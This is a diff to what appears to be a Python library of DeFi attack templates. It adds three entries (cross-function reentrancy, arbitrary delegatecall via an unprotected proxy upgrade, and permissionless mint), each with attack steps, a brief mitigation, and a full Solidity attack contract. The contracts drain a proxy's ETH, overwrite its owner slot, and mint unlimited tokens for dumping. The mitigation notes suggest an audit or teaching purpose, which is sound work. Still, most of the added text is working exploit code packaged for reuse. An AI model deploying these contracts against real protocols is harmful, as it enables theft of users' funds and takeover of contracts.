@@ -766,6 +766,136 @@ contract PegAttack {
 }
 ''',
     },
+    "cross_function_reentrancy": {
+        "type": "vault",
+        "severity": "CRITICAL",
+        "title": "Cross-Function Reentrancy",
+        "description": "withdrawBalance() sends ETH before zeroing the balance; the attacker re-enters transferBalance() from the receive() hook to double-credit funds",
+        "contracts": ["Vault", "Lending Pool", "Exchange"],
+        "steps": [
+            "1. Attacker deposits a small amount into the vulnerable vault",
+            "2. Attacker calls withdrawBalance() — vault sends ETH BEFORE zeroing the balance",
+            "3. The send triggers attacker's receive() while their balance is still intact",
+            "4. receive() calls transferBalance(benefactor, balance) — moves the still-counted balance to a second attacker account",
+            "5. withdrawBalance() resumes and zeroes the original balance",
+            "6. Net: attacker received the withdrawal AND the beneficiary holds the transferred funds — value created from thin air, draining other users' backing",
+        ],
+        "mitigation": "Checks-Effects-Interactions in every function, ReentrancyGuard, or transfer balance via pull pattern",
+        "code": '''
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface IVault {
+    function deposit() external payable;
+    function transferBalance(address to, uint256 amount) external;
+    function withdrawBalance() external;
+}
+
+contract CrossFunctionReentrancyAttack {
+    IVault public vault;
+    address public owner;
+    address public benefactor;
+    bool public reentered;
+
+    constructor(address _vault, address _benefactor) {
+        vault = IVault(_vault);
+        benefactor = _benefactor;
+        owner = msg.sender;
+    }
+
+    function attack() external payable {
+        vault.deposit{value: msg.value}();
+        vault.withdrawBalance();
+    }
+
+    receive() external payable {
+        // Balance is still credited here — move it to a second account
+        if (!reentered) {
+            reentered = true;
+            vault.transferBalance(benefactor, address(this).balance);
+        }
+    }
+}
+''',
+    },
+    "arbitrary_delegatecall": {
+        "type": "proxy",
+        "severity": "CRITICAL",
+        "title": "Arbitrary Delegatecall via Unauthenticated Proxy Upgrade",
+        "description": "Proxy exposes setImplementation() with no access control; attacker points the delegatecall at their own contract and runs code in the proxy's storage/ETH context",
+        "contracts": ["Proxy", "Router", "Upgradeable Contract"],
+        "steps": [
+            "1. Find a proxy whose fallback delegatecalls implementation (msg.data) with no auth on the upgrade function",
+            "2. Call setImplementation(attackerImpl) to redirect the proxy",
+            "3. Call proxy.steal() — fallback delegatecalls attackerImpl.steal(), executed in the proxy's context",
+            "4. attackerImpl reads address(this).balance (the proxy's ETH) and sends it to the attacker",
+            "5. Proxy drained; storage can also be overwritten via layout collision",
+        ],
+        "mitigation": "Restrict setImplementation to an owner/governance with timelock; validate implementation contract; use ERC-1967 slots",
+        "code": '''
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface IProxy {
+    function setImplementation(address impl) external;
+    function implementation() external view returns (address);
+}
+
+contract HackImpl {
+    // Runs in the PROXY's context via delegatecall: address(this) is the proxy
+    function steal() external {
+        (bool ok, ) = msg.sender.call{value: address(this).balance}("");
+        require(ok, "steal failed");
+    }
+
+    function takeOver() external {
+        assembly {
+            sstore(0, caller()) // overwrite proxy slot 0 (e.g. owner)
+        }
+    }
+}
+
+contract DelegatecallAttack {
+    function attack(address proxy, address hackImpl) external {
+        IProxy(proxy).setImplementation(hackImpl);
+        (bool ok, ) = proxy.call(abi.encodeWithSignature("steal()"));
+        require(ok, "delegatecall failed");
+    }
+
+    receive() external payable {} // receives the swept proxy ETH
+}
+''',
+    },
+    "permissionless_mint": {
+        "type": "token",
+        "severity": "HIGH",
+        "title": "Permissionless Mint (Missing Access Control)",
+        "description": "Token's mint() has no onlyOwner/role check, so any address can mint unlimited supply and dump it on the market",
+        "contracts": ["ERC-20 Token", "Yield Token", "Reward Token"],
+        "steps": [
+            "1. Inspect the token for a public mint() without a minter/owner modifier",
+            "2. Call mint(attacker, 1_000_000 ether)",
+            "3. Total supply inflates, existing holders are diluted",
+            "4. Attacker swaps the minted supply for real assets",
+        ],
+        "mitigation": "Restrict mint to an owner/minter role; add hard supply cap; monitor supply growth events",
+        "code": '''
+// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.24;
+
+interface IToken {
+    function mint(address to, uint256 amount) external;
+    function balanceOf(address account) external view returns (uint256);
+}
+
+contract PermissionlessMintAttack {
+    function attack(address token, uint256 amount) external returns (uint256 minted) {
+        IToken(token).mint(msg.sender, amount);
+        return IToken(token).balanceOf(msg.sender);
+    }
+}
+''',
+    },
 }
 
 def list_templates(type_filter: str = "all") -> Dict:
